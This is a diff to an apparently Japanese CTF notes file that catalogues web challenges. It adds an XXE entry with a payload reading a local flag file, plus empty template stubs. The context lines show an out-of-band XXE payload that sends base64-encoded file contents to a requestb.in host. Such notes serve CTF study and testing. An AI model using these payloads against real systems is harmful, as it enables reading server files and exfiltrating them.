@@ -172,6 +172,30 @@ https://qiita.com/no1zy_sec/items/03b8f335e84995fec3e3
 <!ENTITY % filebase64 SYSTEM "php://filter/convert.base64-encode/resource=flag.php">
 <!ENTITY % injme '<!ENTITY startme SYSTEM "https://requestb.in/xxxxxxx?xxe=%filebase64;">'>%injme;
 ```
+## XXE (normai XXE / identify webroot or /proc/self/cwd)
+https://www.aquablog.site/entry/2019/03/25/093034   
+
+- **entrypoint**   
+IndexページのJavascriptのソースコード内にJavascriptでXML形式のデータをXMLHttpRequestで送信して、返ってきたデータを`.innerHTML`に入れて表示する。ここからXXEを疑う。   
+- **概要**   
+応答が返ってくるので普通のXXE。flagのフルパスがわからないので`file:///etc/nginx/sites-enabled/default`でNginxのWebルートを特定するか、`file:///proc/self/cwd/`,`php://filter`とかでflagファイルをゲットできるらしい。   
+- **Payload**   
+```txt
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///var/www/html/epreuve/flag" >]><feedback><author>&xxe;</author><email>a</email><content>undefined</content></feedback>
+```
+## sample
+- **entrypoint**   
+- **概要**   
+- **Payload**   
+## sample
+- **entrypoint**   
+- **概要**   
+- **Payload**   
+## sample
+- **entrypoint**   
+- **概要**   
+- **Payload**   
 ## sample
 - **entrypoint**   
 - **概要**   
